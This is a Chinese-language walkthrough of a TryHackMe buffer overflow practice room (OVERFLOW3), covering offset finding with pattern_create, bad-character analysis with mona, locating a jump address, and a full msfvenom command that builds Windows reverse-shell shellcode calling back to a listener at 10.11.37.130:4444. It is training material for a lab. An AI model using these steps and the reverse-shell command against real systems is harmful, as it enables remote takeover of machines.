在线漏洞平台介绍+前期准备



这次还是用Try hack me的环境。房间号链接是 https://tryhackme.com/room/bufferoverflowprep。建议先连接他们的内网再连接靶机,在线网页版kali的稳定性真随缘,这次是第三关OVERFLOW3。本篇文章的重点是在于脚本的调试不会涉及太多的理论知识。


如果想深入理解缓冲区溢出漏洞的话推荐看看这本理论和实践书。

03

精准定位




下一步就是精准定位，看看到底是在哪个位置崩溃，先使用/usr/share/Metasploit-framework/tools/pattern_create.rb -l 1300生产出1300个字符串
























然后丢到第二个脚本里面，把刚才生成好的字符串贴到buffer变量里。然后稍微改下IP名，和关卡名。重新运行脚本
























此时正常情况下来讲，Immunity Debugger应该显示的是pause状态，如果不是建议检查下是否哪里出错了。接下来就用mona检查下，可以看到有条信息语句EIP contains normal pattern xxx offset 1274, 1274就是overflow3这个程序的极限了。过了1274这个点剩下的就溢出了。



04

寻找坏字符串




由于我们后面的反弹shell是通过shellcode进行编译，然而每个程序并不是认可所有的shellcode,有些不认可的就称为坏字符串。坏字符串通常是不固定的。但\x00确是必然上榜的。由于不确定坏字符串是哪些还是先全部堆进去然后再慢慢调试。这里我提前准备好\x01到\xff的字符串了。
























这里把字符串复制到bad括号里面，然后记得改一下A的数量改为到offset的量，然后再稍微改改IP和关卡名就好。
























运行该脚本，Immunity Debugger进入停止状态。接下来就开始比较哪些是坏字符串了。在下面的输入框中输入mona的比较语句。
























输入完以后会跳到另外一个界面，里面会显示出可能的坏字符串,并不是所有的都是坏字符串,这里建议两个两个这样慢慢比较。
























这里回到badcahr里面来波控制变量法先把\x11删了重新运行再比较发现12没了，而11还在坏字符串榜
























这里了做了一个记录最后圈起来的就是坏字符串。也可慢慢看我写的分析。
























最后确认坏字符串有\x11\x40\x5f\xb8\xee,现在可以用mona通知一波























重新运行一波此时结果显示unmodified代表坏字符串已经没了。

搞定完坏字符串后下一个目标是寻找跳跃点，主要是为了返回地址。在下面输入框中输入查询语句跳出两个跳跃点，可以随便选一个这里我选头顶的。
























然后在最后的payload里面把地址填进去要反过来填并且要\x两个两个分开。



06

制作反弹shell



接下来就是最重要的制作反弹shell,可以用这条msfvenom语句

命令: msfvenom -p windows/shell_reverse_tcp LHOST=10.11.37.130 LPORT=4444 EXITFUNC=thread -b "\x00\x11\x40\x5f\xb8\xee" -f c


然后把生成好的shellcode贴到最后的payload里面去，这里再提下padding那里是解压，我们的shellcode发送过去以后需要留一定的空间让其解压这里留16个x90剩下的前面都有提及。
























最后运行该payload,提前开启nc得到一个反弹shell。
